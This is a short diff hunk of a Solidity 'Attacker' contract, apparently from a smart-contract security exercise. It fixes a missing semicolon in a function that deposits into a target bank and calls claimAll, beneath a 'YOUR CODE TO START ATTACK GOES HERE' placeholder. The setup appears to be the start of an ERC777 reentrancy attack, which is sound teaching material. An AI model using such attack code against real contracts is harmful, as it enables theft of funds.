@@ -38,7 +38,7 @@ contract Attacker is AccessControl, IERC777Recipient {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
 		bank.deposit{value: amt}();
-		bank.claimAll()
+		bank.claimAll();
 	}
 
 	/*
